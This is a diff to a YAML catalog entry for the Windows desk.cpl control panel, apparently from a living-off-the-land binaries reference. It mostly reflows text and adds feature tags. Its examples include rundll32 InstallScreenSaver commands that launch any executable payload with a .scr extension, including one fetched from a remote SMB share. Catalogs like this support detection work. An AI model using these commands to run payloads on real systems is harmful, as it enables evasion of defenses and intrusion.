@@ -2,7 +2,8 @@
 id: windows-execution-desk
 namespace: windows:execution:desk
 name: desk
-description: 'Desktop Settings Control Panel Located at: C:\Windows\System32\desk.cpl; C:\Windows\SysWOW64\desk.cpl.'
+description: 'Desktop Settings Control Panel Located at: C:\Windows\System32\desk.cpl;
+  C:\Windows\SysWOW64\desk.cpl.'
 author: Hai Vaknin
 version: 1.0.0
 capabilities:
@@ -41,7 +42,11 @@ resource_profile:
 allowed-tools:
 - desk
 parameters: []
-features: []
+features:
+- file-system
+- pipes-stdin
+- pipes-stdout
+- process-manip
 execution:
   template: desk
   sandbox: execFile
@@ -49,9 +54,12 @@ execution:
   shell: false
 global_vars: {}
 examples:
-- description: Launch an executable with a .scr extension by calling the InstallScreenSaver function. (Launch any executable payload, as long as it uses the .scr extension.)
+- description: Launch an executable with a .scr extension by calling the InstallScreenSaver
+    function. (Launch any executable payload, as long as it uses the .scr extension.)
   command: rundll32.exe desk.cpl,InstallScreenSaver {PATH_ABSOLUTE:.scr}
-- description: Launch a remote executable with a .scr extension, located on an SMB share, by calling the InstallScreenSaver function. (Launch any executable payload, as long as it uses the .scr extension.)
+- description: Launch a remote executable with a .scr extension, located on an SMB
+    share, by calling the InstallScreenSaver function. (Launch any executable payload,
+    as long as it uses the .scr extension.)
   command: rundll32.exe desk.cpl,InstallScreenSaver {PATH_SMB:.scr}
 references:
 - label: 29A-7.030.txt
@@ -80,7 +88,6 @@ install:
   commands:
   - choco install desk
 ---
-
 
 # desk
 
